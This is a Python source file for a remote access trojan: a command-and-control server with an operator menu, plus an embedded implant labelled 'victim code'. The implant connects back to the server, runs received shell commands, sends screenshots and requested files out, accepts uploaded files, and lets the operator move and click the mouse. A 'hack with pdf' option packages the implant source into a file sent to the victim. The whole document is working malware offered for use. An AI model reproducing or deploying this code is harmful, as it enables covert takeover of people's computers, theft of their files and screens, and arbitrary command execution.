import time
import socket
import threading
from PIL import Image
import os
from reportlab.pdfgen import canvas
SERVER_IP = socket.gethostname()
# print()
DATA_PORT = 8000  # Port for data exchange
STATUS_PORT = 9000  # Port for connection monitoring
data_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
status_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
data_socket.bind((SERVER_IP, DATA_PORT))
status_socket.bind((SERVER_IP, STATUS_PORT))


# keyList = ['userId','dataPort','statusPort','lastOnline']
myDic = {}  # dict(zip(keyList, [None]*len(keyList)))
# victim code
code = r'''#your code
import time
import socket
import threading
import pyautogui
import os
import subprocess
SERVER_IP = socket.gethostname()
DATA_PORT = 8000  # Port for data exchange
STATUS_PORT = 9000  # Port for connection monitoring



def send_data(data_socket):
    try:
        while True:

            print('new epoch')
            data_socket.settimeout(120.0)
            num = data_socket.recv(1024).decode()
            num = int(num)
            #print(num)
            if num ==1 :
                num2 = int(data_socket.recv(1024).decode())
                if num2 == 1:
                    # Get the current mouse position
                    current_x, current_y = pyautogui.position()
                    print("Current mouse position:", current_x, current_y)

                    # Move the mouse to a new position
                    screen_width, screen_height = pyautogui.size()
                    print("Screen resolution:", screen_width, "x", screen_height)
                    data_socket.send(str(screen_width).encode())
                    data_socket.send(str(screen_height).encode())
                    new_x = int(data_socket.recv(1024).decode())
                    print('x taked')
                    new_y = int(data_socket.recv(1024).decode())
                    print('y taked')
                    #print(new_x,new_y)
                    ack= 'ok'
                    data_socket.send(ack.encode())
                    # Duration is optional, it specifies the time taken to move the mouse
                    pyautogui.moveTo(new_x, new_y, duration=1.0)
                    bye = data_socket.recv(1024).decode()
                    print(bye)
                    # Get the updated mouse position
                    updated_x, updated_y = pyautogui.position()
                    print("Updated mouse position:", updated_x, updated_y)
                if num2 == 2 :
                    pyautogui.click()
                    print('clicked')
                    data_socket.send(('Mouse clicked successfully').encode())
                if num2 == 3:
                    current_x, current_y = pyautogui.position()
                    print("Current mouse position:", current_x, current_y)
                    num3 = int(data_socket.recv(1024).decode())
                    n = int(data_socket.recv(1024).decode())
                    if num3 == 1:

                        # Scroll up by n pixels
                        pyautogui.scroll(n)
                        updated_x, updated_y = pyautogui.position()
                        print("Updated mouse position:", updated_x, updated_y)
                    elif num3==2:
                        # Scroll down by n pixels
                        pyautogui.scroll(-1*(n))
                        updated_x, updated_y = pyautogui.position()
                        print("Updated mouse position:", updated_x, updated_y)

                    data_socket.send(('Mouse Scrolled successfully').encode())
            if num == 2 :
                # Capture the entire screen
                screenshot = pyautogui.screenshot()
                screenshot.save('screenshot.png')
                myfile = open('screenshot.png', 'rb')
                bytes = myfile.read()
                print('screenshot taken succesfully')
                data_socket.sendall(bytes)
            if num == 3 :
                file_name = data_socket.recv(1024).decode()
                print('file name recieved!')
                print("file name : " , file_name)
                if os.path.exists(file_name):
                        print("File exists.")
                        try:
                            with open(file_name, 'rb') as file:
                                data_socket.send(("yes").encode())
                                bytes = file.read()
                                data_socket.sendall(bytes)
                                print("File sent successfully!")
                                msg = data_socket.recv(1024)
                                print('wait for 2 minutes')
                        except IOError:
                            print("File not found or could not be opened.")
                            data_socket.send(("no").encode())
                else:
                    print("File does not exist.")
                    data_socket.send(("no").encode())
            if num == 4:
                while True:
                    command = data_socket.recv(1024).decode()
                    print('command recieved!')
                    print(command)
                    if command == 'exit':
                        break
                    else:
                        proc = subprocess.Popen(
                            command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        output= proc.stdout.read()+proc.stderr.read()
                        data_socket.send(output)
                        print(output)
            if num == 5 :
                    file_name = data_socket.recv(1024).decode()
                    print('file name recieved!')
                    file_ext = file_name.split('.')[1]
                    data = data_socket.recv(40960000)
                    print('data recieved')
                    # Save the received data as a file
                    if data:
                        second_path = r"C:\Users\pzedb\my_projects\victim." + file_ext
                        with open(second_path, 'wb') as file:
                            file.write(data)
                        file.close()
                        print("File received successfully!")

                        msg = data_socket.recv(1024).decode("utf-8")
                        print(msg)
                        data_socket.send(('recieved').encode())

    except:
        #end thread
        print('\n data socket error closed')


def send_status(status_socket):

    while True :
        # Send status message to the server
        status_msg = "I'm still connected"
        status_socket.send(status_msg.encode())

        print('\nsend status')

        # Sleep for 2 minutes
        time.sleep(12.0)


def start_client():
    data_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    data_socket.connect((SERVER_IP, DATA_PORT))
    userid = data_socket.recv(1024)
    print(userid)

    print('start data thread')
    #Start a thread for sending data
    data_thread = threading.Thread(target=send_data , args=(data_socket,))
    data_thread.start()

    status_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    status_socket.connect((SERVER_IP, STATUS_PORT))
    status_socket.send(userid)
    msg = status_socket.recv(1024)
    print(msg)


    print('start status thread')
    #Start a thread for sending status messages
    status_thread = threading.Thread(target=send_status,args=(status_socket,))
    status_thread.start()

start_client()
'''

# userId generator
count = 0


def UserId():
    global count
    count = count + 1

    return count


def create_pdf_with_code(code, pdf_path):
    c = canvas.Canvas(pdf_path)
    c.setFont("Courier", 10)
    lines = code.split('\n')
    y = 800  # Starting y-coordinate
    for line in lines:
        c.drawString(10, y, line)
        y -= 12  # Adjust the line spacing
    c.save()


def handle_client_data(userId):
    global myDic
    try:
        data_socket = myDic[userId]['datasocket']
        while (myDic[userId]['lastOnline'] - time.time()) < 120.0:

            num = input(
                'input 1 or 2 or 3 or 4 or 5 or 6 (1:control mouse,2:get screenshot,3:get file ,4:acess shell,5: send file  , 6: hack with pdf, 7:exit! \n')
            print('you choosed', num)
            data_socket.send(num.encode())
            num = int(num)
            if num == 1:

                num2 = int(
                    input('input 1 or 2 or 3 (1:move mouse,2: click mouse,3: scroll mouse \n'))
                data_socket.send(str(num2).encode())
                if num2 == 1:
                    screen_width = data_socket.recv(1024).decode()

                    screen_height = data_socket.recv(1024).decode()

                    print("Screen resolution:", screen_width, "x", screen_height)
                    new_x = input('input from 0 to ' + screen_width + '\n')
                    new_y = input('input from 0 to ' + screen_height + '\n')
                    data_socket.send(str(new_x).encode())
                    data_socket.send(str(new_y).encode())
                    print('.')
                    ack = data_socket.recv(1024)
                    print("new mouse position:", new_x, new_y)
                    data_socket.send(('bye').encode())
                if num2 == 2:
                    msg = data_socket.recv(1024).decode()
                    print(msg)
                if num2 == 3:
                    num3 = int(input('scroll 1:up or 2: down'))
                    data_socket.send(str(num3).encode())
                    print('scroll direction taken')

                    size = int(
                        input('how many pixles?(less than 200 & positive)'))

                    data_socket.send(str(size).encode())
                    print('size taken')
                    msg = data_socket.recv(1024).decode()
                    print(msg)
            if num == 2:
                data = data_socket.recv(40960000)
                myfile = open('screenshot2.png', 'wb')
                if not data:
                    myfile.close()
                    continue
                myfile.write(data)
                myfile.close()
                # read the image
                im = Image.open('screenshot2.png')

                # show image
                im.show()

                print('screenshot taken succesfully')
            if num == 3:
                # r"C:\Users\pzedb\my_projects\screenshot2.png"
                file_name = input("Enter the file name")
                file_ext = file_name.split('.')[1]
                data_socket.send(file_name.encode())
                msg = data_socket.recv(1024)
                if msg.decode().startswith('y'):
                    print('file exist!')
                    data = data_socket.recv(40960000)
                    print('data recieved')
                    # Save the received data as a file
                    if data:
                        second_path = r"C:\Users\pzedb\my_projects\attack." + file_ext
                        with open(second_path, 'wb') as file:
                            file.write(data)
                        file.close()
                        print("File received successfully!")
                        data_socket.send(('recieved').encode())

                else:
                    print("File not found or could not be received.")
            if num == 4:
                while True:
                    command = input("Shell>>")
                    if command == 'exit':
                        data_socket.send(('exit').encode())
                        break
                    else:
                        data_socket.send(command.encode())
                        output = data_socket.recv(1024)
                        print(output)
            if num == 5:

                # r'C:\Users\pzedb\my_projects\attack.pdf'
                file_name = input('which file>>')
                print('file name recieved!')
                print("file name : ", file_name)
                if os.path.exists(file_name):
                    print("File exists.")
                    try:
                        with open(file_name, 'rb') as file:
                            data_socket.send(file_name.encode())
                            bytes = file.read()
                            data_socket.sendall(bytes)
                            print("File sent successfully!")
                            msg = data_socket.recv(1024)
                            print('wait for 2 minutes')

                    except IOError:
                        print("Erorr Ocured")

                        continue

                else:
                    print("File does not exist.")

                    continue

            if num == 6:
                global code

                msg = data_socket.recv(1024)
                if os.path.exists("myfile.txt") != True:
                    f = open("myfile.txt", "x")
                    pdf_path = f.name
                else:
                    pdf_path = "myfile.txt"
                create_pdf_with_code(code, pdf_path)
                with open(pdf_path, 'rb') as file:
                    print('file opened!')
                    while True:
                        chunk = file.read(1024)
                        if not chunk:
                            print('finish')

                            data_socket.send(("f").encode('latin-1'))
                            break
                        data_socket.sendall(chunk)
                        print('sending..')
            if num == 7:
                print('\n data socket closed it will takes time to close status socket')
                myDic[userId]['lastOnline'] = -1

                break

        return

    except:
        print('\n data  socket closed')
        myDic[userId]['lastOnline'] = -1

        return


def handle_client_status(userId):
    global myDic
    try:
        while myDic[userId]['lastOnline']:

            status_socket = myDic[userId]['statussocket']

            # wait for 2 minute
            status_socket.settimeout(120000.0)
            status_socket.recv(1024)
            # update last time

            if myDic[userId]['lastOnline'] == -1:
                print('\n client disconnected')
                myDic[userId]['statussocket'].close()

                myDic[userId]['datasocket'].close()
                myDic.pop(userId)
                print('\n status socket closed')
                print('active threads : ', threading.active_count() - 2)
                return
            else:

                myDic[userId]['lastOnline'] = time.time()
                print('\ngot status')

    except:
        myDic[userId]['lastOnline'] = -1

        print('\n client disconnected')
        myDic[userId]['statussocket'].close()

        myDic[userId]['datasocket'].close()
        myDic.pop(userId)
        print('\n status socket closed')

        return


def accept_clients():
    global myDic
    while True:

        # Wait for a client to connect for data exchange
        data_socket.listen(5)  # Adjust the backlog size as needed
        print('listen on port data')
        print('active threads : ', threading.active_count())
        client_data, address_data = data_socket.accept()
        userId = UserId()
        client_data.send(str(userId).encode())
        myDic[userId] = {'datasocket': client_data,
                         'statussocket': None, 'lastOnline': time.time()}
        print('connected_data ')
        print(myDic.keys())

        # Start a thread to handle data exchange for this client
        data_thread = threading.Thread(
            target=handle_client_data, args=(userId,))
        data_thread.start()
        print('start thread data')

        # Wait for a client to connect for connection monitoring

        status_socket.listen(5)  # Adjust the backlog size as needed
        print('listen on port status')

        client_status, address_status = status_socket.accept()
        userid = int(client_status.recv(1024).decode())
        if userid in myDic:

            ack = 'ok'
            client_status.send(ack.encode())

            print('connected_status')
            myDic[userid]['statussocket'] = client_status
            myDic[userid]['lastOnline'] = time.time()
            print(myDic.keys())

            # Start a thread to handle connection monitoring for this client
            status_thread = threading.Thread(
                target=handle_client_status, args=(userid,))
            status_thread.start()
            print('start thread status')
        else:
            client_status.close()


accept_clients()
